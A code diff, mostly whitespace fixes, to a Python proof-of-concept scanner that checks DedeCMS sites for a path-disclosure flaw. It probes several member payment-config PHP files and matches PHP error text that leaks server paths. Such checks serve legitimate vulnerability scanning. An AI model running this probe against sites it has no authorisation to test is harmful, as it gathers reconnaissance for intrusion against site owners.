@@ -4,11 +4,12 @@ from CScanPoc.thirdparty import requests
 from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType
 import re
 
+
 class Vuln(ABVuln):
-    vuln_id = 'DedeCMS_0013' # 平台漏洞编号，留空
+    vuln_id = 'DedeCMS_0013'  # 平台漏洞编号，留空
     name = '织梦CMS 路径泄漏'  # 漏洞名称
     level = VulnLevel.HIGH  # 漏洞危害级别
-    type = VulnType.INFO_LEAK # 漏洞类型
+    type = VulnType.INFO_LEAK  # 漏洞类型
     disclosure_date = 'Unknown'  # 漏洞公布时间
     desc = '''
         织梦CMS多处路径泄露：
@@ -25,6 +26,7 @@ class Vuln(ABVuln):
     product = 'DedeCMS(织梦CMS)'  # 漏洞应用名称
     product_version = 'Unknown'  # 漏洞应用版本
 
+
 class Poc(ABPoc):
     poc_id = '6379d82c-06d9-409a-8f47-972ef133b738'
     author = '47bwy'  # POC编写者
@@ -37,9 +39,9 @@ class Poc(ABPoc):
         try:
             self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                 target=self.target, vuln=self.vuln))
-            
+
             payloads = [
-                '/member/inc/config_pay_yeepay.php', 
+                '/member/inc/config_pay_yeepay.php',
                 '/member/inc/config_pay_tenpay.php',
                 '/member/inc/config_pay_nps.php ',
                 '/member/inc/config_pay_cbpayment.php ',
@@ -49,7 +51,7 @@ class Poc(ABPoc):
             for payload in payloads:
                 verify_url = self.target + payload
                 r = requests.get(verify_url)
-                
+
                 if r.status_code == 200 and re.search('in <b>([^<]+)</b>', r.text):
                     self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
                         target=self.target, name=self.vuln.name))
@@ -59,6 +61,7 @@ class Poc(ABPoc):
 
     def exploit(self):
         self.verify()
+
 
 if __name__ == '__main__':
     Poc().run()
